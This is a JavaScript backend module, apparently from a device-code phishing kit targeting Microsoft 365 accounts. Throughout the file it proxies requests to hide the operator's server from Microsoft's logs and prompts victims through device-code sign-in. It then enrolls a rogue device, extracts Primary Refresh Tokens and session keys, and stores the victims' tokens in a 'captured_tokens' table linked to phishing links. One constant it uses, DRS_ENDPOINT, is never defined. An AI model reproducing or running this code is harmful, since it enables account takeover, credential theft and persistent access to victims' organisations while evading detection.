/**
 * devicecode.js
 *
 * Backend device code flow with proxy support and PRT extraction.
 *
 * Why this exists:
 * - All outbound calls go through microsoftclient (proxied), so the VPS IP
 *   never appears in Microsoft's logs.
 * - The device_code request and every subsequent token poll MUST use the same
 *   proxy — Microsoft binds the device_code to the IP that requested it. A
 *   random proxy per call would silently break the token exchange.
 * - The PRT is returned in the Set-Cookie header of the token response as
 *   `x-ms-RefreshTokenCredential`. The old code read only `response.data`
 *   and threw those headers away, so PRTs were never captured.
 */

const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');
const ms = require('./microsoftclient');
const crypto = require('crypto');
const forge = require('node-forge');

const TENANT = config.AZURE_TENANT || 'common';

// ── GraphSpy exact endpoints / scopes (core/device_codes.py, core/device.py) ──
// device_codes.generate(version=2)
const TOKEN_ENDPOINT_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
// poll() token exchange
const POLL_ENDPOINT_V2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
// device.register() - note the REQUIRED ?api-version=2.0
const DEFAULT_DEVICE_CODE_SCOPE = 'https://graph.microsoft.com/.default openid offline_access';
// core/user_agent.py DEFAULT_USER_AGENT
const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0';
// device.register() fixed CSR subject CN -> device_id
const DEVICE_CSR_CN = '7E980AD9-B86D-4306-9425-9AC066FB014A';
// device.register() default os_version
const DEVICE_OS_VERSION = '10.0.26100';

/**
 * Generate a random device name like DESKTOP-ABCDEF.
 *
 * @returns {string}
 */
function generateDeviceName() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let name = 'DESKTOP-';

  for (let i = 0; i < 8; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }

  return name;
}

/**
 * Generate an RSA key pair and PKCS#10 CSR using node-forge.
 *
 * @param {string} commonName
 * @returns {{ privateKeyPem: string, publicKeyPem: string, csrPem: string, csrDerBase64: string }}
 */
function generateKeyPairAndCsr(commonName) {
  const keys = forge.pki.rsa.generateKeyPair(2048);

  const privateKeyPem = forge.pki.privateKeyToPem(keys.privateKey);
  const publicKeyPem = forge.pki.publicKeyToPem(keys.publicKey);

  const csr = forge.pki.createCertificationRequest();
  csr.publicKey = keys.publicKey;
  csr.setSubject([{ name: 'commonName', value: commonName }]);
  csr.sign(keys.privateKey);

  const csrPem = forge.pki.certificationRequestToPem(csr);

  // Convert CSR to DER and base64 for DRS
  let csrDerBase64 = null;
  try {
    const csrDer = forge.asn1.toDer(forge.pki.certificationRequestToAsn1(csr)).getBytes();
    csrDerBase64 = Buffer.from(csrDer, 'binary').toString('base64');
  } catch (csrErr) {
    const pemBody = csrPem
      .replace('-----BEGIN CERTIFICATE REQUEST-----', '')
      .replace('-----END CERTIFICATE REQUEST-----', '')
      .replace(/[\r\n\s]/g, '');
    csrDerBase64 = pemBody || null;
  }

  return {
    privateKeyPem,
    publicKeyPem,
    csrPem,
    csrDerBase64,
  };
}

/**
 * Request a device code from Microsoft using the broker client ID and
 * the deviceRegistration scope.
 *
 * NOTE: The returned proxy must be passed to the next polling step.
 * Microsoft binds the flow to the requesting IP.
 *
 * @returns {Promise<object>}
 */
async function requestDeviceCode() {
  // GraphSpy device_codes.generate(version=2, ngcmfa=True, cae=True):
  //
  //   body = {"client_id": client_id, "scope": scope}
  //   if ngcmfa or cae:
  //       body["claims"] = json.dumps({"access_token": {
  //           "amr":    {"values": ["ngcmfa"]},      # ngcmfa
  //           "xms_cc": {"values": ["cp1"]}}})       # cae
  //   url = ".../common/oauth2/v2.0/devicecode"
  //
  // The claims are sent on EVERY request in V-C - they are not optional.
  // amr=ngcmfa forces the victim through MFA during device-code auth and
  // xms_cc=cp1 opts into Continuous Access Evaluation.
  const claims = {
    access_token: {
      amr: { values: ['ngcmfa'] },
      xms_cc: { values: ['cp1'] },
    },
  };

  const { proxy, response } = await ms.post(
    TOKEN_ENDPOINT_V2,
    new URLSearchParams({
      client_id: config.AZURE_CLIENT_ID,
      scope: DEFAULT_DEVICE_CODE_SCOPE,
      claims: JSON.stringify(claims),
    }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': USER_AGENT,
      },
      timeout: 15000,
      stickyProxy: true,
    }
  );

  return {
    device_code: response.data.device_code,
    user_code: response.data.user_code,
    verification_uri: response.data.verification_uri,
    expires_in: response.data.expires_in,
    interval: response.data.interval || 5,
    message: response.data.message,
    proxy,
  };
}

/**
 * GraphSpy device.generate_public_key_rsa_blob():
 *
 *   header = b"RSA1" + u32le(key_size) + u32le(len(exp)) + u32le(len(mod))
 *            + u32le(0) + u32le(0)
 *   blob   = base64(header + exp_bytes + mod_bytes)
 *
 * @param {string} publicKeyPem
 * @returns {string} base64 TransportKey
 */
function generatePublicKeyRsaBlob(publicKeyPem) {
  const jwk = crypto.createPublicKey(publicKeyPem).export({ format: 'jwk' });
  const expBytes = Buffer.from(jwk.e, 'base64url');
  const modBytes = Buffer.from(jwk.n, 'base64url');
  const header = Buffer.alloc(4 + 5 * 4);
  header.write('RSA1', 0, 'ascii');
  header.writeUInt32LE(modBytes.length * 8, 4);
  header.writeUInt32LE(expBytes.length, 8);
  header.writeUInt32LE(modBytes.length, 12);
  header.writeUInt32LE(0, 16);
  header.writeUInt32LE(0, 20);
  return Buffer.concat([header, expBytes, modBytes]).toString('base64');
}

/**
 * Enroll a device through DRS using an access token from the broker flow.
 *
 * @param {string} accessToken
 * @param {string} deviceCodeId
 * @param {string} tenant
 * @param {object} proxy
 * @returns {Promise<{ deviceId, deviceCertificate, privateKeyPem, csrDerBase64, deviceName }>}
 */
async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
  // GraphSpy device.register() uses a FIXED CSR subject CN and reads the
  // device_id back out of the certificate AAD issues.
  const deviceName = generateDeviceName();
  const { privateKeyPem, publicKeyPem, csrDerBase64 } = generateKeyPairAndCsr(DEVICE_CSR_CN);

  // GraphSpy register(target_domain=...) - defaults to e-corp.local there; here
  // the tenant is the real domain, falling back to the same "common" sentinel.
  const targetDomain = tenant && tenant !== 'common' ? tenant : 'common';

  // GraphSpy device.register() request_body - exact key set:
  //   CertificateRequest, TransportKey, TargetDomain, DeviceType,
  //   OSVersion, DeviceDisplayName, JoinType, attributes
  const enrollmentBody = {
    CertificateRequest: {
      Type: 'pkcs10',
      Data: csrDerBase64,
    },
    TransportKey: generatePublicKeyRsaBlob(publicKeyPem),
    TargetDomain: targetDomain,
    DeviceType: 'Windows',
    OSVersion: DEVICE_OS_VERSION,
    DeviceDisplayName: deviceName,
    JoinType: 0,
    attributes: {
      ReuseDevice: 'true',
      ReturnClientSid: 'true',
    },
  };

  console.log('[devicecode] DRS enrollment starting');

  const response = await ms.post(
    DRS_ENDPOINT,
    JSON.stringify(enrollmentBody),
    {
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'User-Agent': 'Microsoft-Workplace-Join/1.0',
      },
      timeout: 30000,
      proxy,
      validateStatus: () => true,
    }
  );

  if (response.status !== 200) {
    const errorMsg =
      response.data?.error_description ||
      response.data?.Message ||
      JSON.stringify(response.data);

    throw new Error(`DRS enrollment failed (${response.status}): ${errorMsg}`);
  }

  const data = response.data;
  console.log('[devicecode] DRS enrollment response received');

  // GraphSpy device.register():
  //     certificate_base64 = response_json["Certificate"]["RawBody"]
  //     device_id          = certificate.subject COMMON_NAME
  let certRaw = data.Certificate || data.certificate || data.deviceCertificate || data.x509Certificate;
  if (certRaw && typeof certRaw === 'object') {
    certRaw = certRaw.RawBody || certRaw.rawBody || certRaw.value || null;
  }
  if (!certRaw) {
    throw new Error('DRS enrollment succeeded but no device certificate returned');
  }

  // base64 DER -> PEM. GraphSpy keeps base64 DER; V-C rows hold PEM.
  let deviceCertificate = String(certRaw);
  let certificateDerBase64 = null;
  if (deviceCertificate.includes('-----BEGIN')) {
    certificateDerBase64 = deviceCertificate
      .replace(/-----BEGIN CERTIFICATE-----/g, '')
      .replace(/-----END CERTIFICATE-----/g, '')
      .replace(/[\r\n\s]/g, '');
  } else {
    certificateDerBase64 = deviceCertificate.replace(/\s/g, '');
    deviceCertificate =
      '-----BEGIN CERTIFICATE-----\n' +
      (certificateDerBase64.match(/.{1,64}/g) || []).join('\n') +
      '\n-----END CERTIFICATE-----';
  }

  // device_id = subject CN of the certificate AAD issued (GraphSpy NameOID.COMMON_NAME)
  let deviceId = null;
  try {
    const subject = new crypto.X509Certificate(deviceCertificate).subject;
    const cn = subject.split(/[,\n]/).map(s => s.trim()).find(s => s.indexOf('CN=') === 0);
    if (cn) deviceId = cn.slice(3).trim();
  } catch (eCert) { /* fall through to response fields */ }
  if (!deviceId) deviceId = data.DeviceId || data.deviceId || data.device_id;

  return {
    deviceId,
    deviceCertificate,
    certificateDerBase64,
    privateKeyPem,
    csrDerBase64,
    deviceName,
  };
}

/**
 * Build a client assertion JWT signed with the device private key.
 *
 * Used for RFC 7521 / RFC 7523 device-bound token renewal.
 *
 * @param {string} privateKeyPem
 * @param {string} deviceId
 * @param {string} audience
 * @returns {string}
 */
function buildClientAssertion(privateKeyPem, deviceId, audience) {
  const privateKey = forge.pki.privateKeyFromPem(privateKeyPem);

  const header = { alg: 'RS256', typ: 'JWT' };
  const now = Math.floor(Date.now() / 1000);

  const payload = {
    aud: audience,
    iss: deviceId,
    sub: deviceId,
    jti: crypto.randomUUID(),
    exp: now + 3600,
    iat: now,
  };

  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');

  const signingInput = `${headerB64}.${payloadB64}`;

  const md = forge.md.sha256.create();
  md.update(signingInput, 'utf8');

  const signature = privateKey.sign(md);
  const signatureB64 = Buffer.from(signature, 'binary').toString('base64url');

  return `${signingInput}.${signatureB64}`;
}

/**
 * Renew tokens via device certificate using the client_assertion flow.
 *
 * @param {string} privateKeyPem
 * @param {string} deviceId
 * @param {string} tenant
 * @param {string} clientId
 * @param {string} scope
 * @param {object} proxy
 * @returns {Promise<object>}
 */
async function renewTokenWithDeviceCert(
  privateKeyPem,
  deviceId,
  tenant,
  clientId,
  scope,
  proxy
) {
  const tokenEndpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
  const audience = tokenEndpoint;

  const clientAssertion = buildClientAssertion(
    privateKeyPem,
    deviceId,
    audience
  );

  const params = new URLSearchParams({
    grant_type: 'client_credentials',
    client_id: clientId,
    client_assertion_type:
      'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    client_assertion: clientAssertion,
    scope: scope,
  });

  const response = await ms.post(
    tokenEndpoint,
    params,
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      timeout: 30000,
      proxy,
      validateStatus: () => true,
    }
  );

  if (response.status !== 200) {
    throw new Error(
      `Device cert token renewal failed (${response.status}): ${JSON.stringify(response.data)}`
    );
  }

  return response.data;
}



/**
 * Poll for tokens, extracting the PRT from Set-Cookie headers.
 *
 * @param {string} deviceCode
 * @param {number} linkId
 * @param {number} userId
 * @param {number} initialInterval
 * @param {object} proxy  - the SAME proxy returned by requestDeviceCode
 * @returns {object} { success, email, access_token, refresh_token, prt,
 *                     session_key_jwe, device_tenant_id, cookies, proxy }
 */
async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy) {
    const maxAttempts = 60;
    let attempts = 0;
    let interval = initialInterval || 5;

    while (attempts < maxAttempts) {
        attempts++;
        await new Promise(resolve => setTimeout(resolve, interval * 1000));

        let response;
        try {
            response = await ms.post(
                POLL_ENDPOINT_V2,
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: config.AZURE_CLIENT_ID,
                    device_code: deviceCode,
                }),
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 15000,
                    proxy,
                }
            );
        } catch (err) {
            const errorCode = err.response?.data?.error || '';

            if (errorCode === 'authorization_pending') continue;
            if (errorCode === 'slow_down') { interval += 5; continue; }
            if (errorCode === 'authorization_declined') {
                return { success: false, error: 'User declined authorization', proxy };
            }
            if (errorCode === 'expired_token') {
                return { success: false, error: 'Code expired', proxy };
            }
            if (attempts >= maxAttempts) {
                return { success: false, error: 'Timeout waiting for user', proxy };
            }
            continue;
        }

        // Tokens received — extract cookies and persist
        const tokenData = response.data;
        const setCookieHeaders = response.headers['set-cookie'] || [];
        const parsedCookies = ms.parseSetCookieCookies(setCookieHeaders);

        const { access_token, refresh_token, id_token } = tokenData;

        let email = null;
        if (id_token) {
            try {
                const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
                email = payload.email || payload.upn || payload.preferred_username || null;
            } catch (e) { /* ignore decode errors */ }
        }

        // Fallback PRT source: the x-ms-RefreshTokenCredential Set-Cookie.
        // GraphSpy does NOT use this - it reads the raw PRT from
        // request_for_device()'s response["refresh_token"]. Kept only for
        // flows where request_for_device could not run.
        const xmsPrtCookie = parsedCookies['x-ms-RefreshTokenCredential'] || null;
        const sessionKeyJwe = parsedCookies['ESTSAUTH'] || null;
        const deviceTenantId = parsedCookies['X-Device-Tenant-Id'] || null;

        // Try to parse the id_token's client_info claim for device_tenant_id
        let deviceTenantIdClaim = deviceTenantId;
        if (id_token && !deviceTenantIdClaim) {
            try {
                const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
                if (payload.client_info) {
                    const info = JSON.parse(Buffer.from(payload.client_info, 'base64').toString());
                    deviceTenantIdClaim = info.did || null;
                }
            } catch (e) { /* ignore */ }
        }

        // Persist all captured data
        const clientIdUsed = config.AZURE_CLIENT_ID;
        const tenant = TENANT;

        // Broker flow device enrollment
        let deviceId = null;
        let deviceEnrolled = false;
        let enrollmentTime = null;
        let deviceCertificateEncrypted = null;
        let encryptedPrivateKey = null;
        let privateKeyPemForPrt = null;
        let certificateForPrt = null;

        if (access_token) {
            try {
                const accessPayload = JSON.parse(Buffer.from(access_token.split('.')[1], 'base64').toString());
                deviceId = accessPayload['device_code_id'] || accessPayload['xms_device_id'] || accessPayload['oid'] || null;
            } catch (e) {
                deviceId = null;
            }
        }

        if (deviceId) {
            try {
                const enrollmentResult = await enrollDevice(access_token, deviceId, TENANT, proxy);
                deviceEnrolled = true;
                enrollmentTime = new Date();

                const { deviceCertificate, certificateDerBase64, privateKeyPem } = enrollmentResult;
                deviceCertificateEncrypted = deviceCertificate ? encrypt(deviceCertificate) : null;
                encryptedPrivateKey = privateKeyPem ? encrypt(privateKeyPem) : null;
                privateKeyPemForPrt = privateKeyPem || null;
                certificateForPrt = certificateDerBase64 || null;
                deviceId = enrollmentResult.deviceId || deviceId;

                console.log(`[devicecode] Device enrolled: ${enrollmentResult.deviceName} (${deviceId})`);
            } catch (enrollErr) {
                console.error('[devicecode] Device enrollment failed:', enrollErr.message);
                deviceEnrolled = false;
            }
        }

        // GraphSpy device_codes.poll() auto_action == "device_prt" runs:
        //     register(...) -> request_for_device(device_id, refresh_token_id, os_version)
        // request_for_device POSTs a device-signed RS256 jwt to
        // /common/oauth2/token and reads the RAW PRT out of
        // response["refresh_token"], then RSA-OAEP decrypts session_key_jwe
        // with the device private key. That is the real PRT acquisition path;
        // the Set-Cookie values are only a fallback.
        let rawPrt = null;
        let sessionKeyHex = null;
        if (privateKeyPemForPrt && certificateForPrt && refresh_token) {
            try {
                const prtkdf = require('./prtkdf');
                const prtResult = await prtkdf.requestPrtForDevice({
                    refreshToken: refresh_token,
                    privateKeyPem: privateKeyPemForPrt,
                    certificateBase64: certificateForPrt,
                    osVersion: DEVICE_OS_VERSION,
                });
                rawPrt = prtResult.prt;
                sessionKeyHex = prtResult.sessionKeyHex;
                console.log('[devicecode] PRT captured via request_for_device (GraphSpy parity)');

                // Persist the decrypted session key where
                // resolveSessionKeyForToken()/getStoredSessionKey() read it -
                // same column devicemanager.capturePrtSessionKey() writes.
                try {
                    await db.query(
                        'UPDATE device_credentials SET session_key_encrypted = ?, updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
                        [encrypt(sessionKeyHex), userId, tenant]
                    );
                } catch (skErr) {
                    console.warn('[devicecode] session key not stored in device_credentials:', skErr.message);
                }
            } catch (prtErr) {
                console.error('[devicecode] request_for_device failed:', prtErr.message);
            }
        }

        // GraphSpy stores the RAW PRT (response["refresh_token"]). The
        // x-ms-RefreshTokenCredential cookie is a fallback only.
        const storedPrt = rawPrt || xmsPrtCookie || null;

        try {
          await db.query(
              `INSERT INTO captured_tokens
               (user_id, link_id, email, token_type, access_token_encrypted,
                refresh_token_encrypted, id_token_encrypted,
                prt, session_key_jwe, device_tenant_id,
                ip_address, user_agent, expiration, tenant, template_type, client_id,
                account_type,
                device_id, device_certificate_encrypted, encrypted_private_key,
                device_enrolled, enrollment_time)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
              [
                  userId, linkId, email, 'token',
                  access_token ? encrypt(access_token) : null,
                  refresh_token ? encrypt(refresh_token) : null,
                  id_token ? encrypt(id_token) : null,
                  storedPrt ? encrypt(storedPrt) : null,
                  sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
                  deviceTenantIdClaim,
                  '0.0.0.0',
                  'Device Code Flow',
                  tenant, 'office', clientIdUsed,
                  tenant === 'common' ? 'unknown' : 'work_school',
                  deviceId,
                  deviceCertificateEncrypted,
                  encryptedPrivateKey,
                  deviceEnrolled ? 1 : 0,
                  enrollmentTime,
              ]
          );
        } catch (insertErr) {
          const msg = insertErr?.message || '';
          if (/Unknown column 'device_id'/.test(msg) || /Unknown column 'device_certificate_encrypted'/.test(msg) || /Unknown column 'encrypted_private_key'/.test(msg) || /Unknown column 'device_enrolled'/.test(msg) || /Unknown column 'enrollment_time'/.test(msg) || /Unknown column 'session_key_jwe'/.test(msg) || /Unknown column 'device_tenant_id'/.test(msg) || /Unknown column 'client_info'/.test(msg)) {
            console.warn('[devicecode] Device columns missing, falling back to legacy insert');
            await db.query(
                `INSERT INTO captured_tokens
                 (user_id, link_id, email, token_type, access_token_encrypted,
                  refresh_token_encrypted, id_token_encrypted,
                  prt, client_info, session_key_jwe, device_tenant_id,
                  ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?)`,
                [
                    userId, linkId, email, 'token',
                    access_token ? encrypt(access_token) : null,
                    refresh_token ? encrypt(refresh_token) : null,
                    id_token ? encrypt(id_token) : null,
                    storedPrt ? encrypt(storedPrt) : null,
                    null,
                    sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
                    deviceTenantIdClaim,
                    '0.0.0.0',
                    'Device Code Flow',
                    tenant, 'office',
                    tenant === 'common' ? 'unknown' : 'work_school',
                    clientIdUsed,
                ]
            );
          } else {
            throw insertErr;
          }
        }

        return {
            success: true,
            email,
            access_token,
            refresh_token,
            id_token,
            prt: storedPrt,
            session_key_jwe: sessionKeyJwe,
            device_tenant_id: deviceTenantIdClaim,
            cookies: parsedCookies,
            proxy,
        };
    }

    return { success: false, error: 'Timeout', proxy };
}



module.exports = {
  requestDeviceCode,
  pollForTokens,
  generateDeviceName,
  generateKeyPairAndCsr,
  enrollDevice,
  buildClientAssertion,
  renewTokenWithDeviceCert,
};
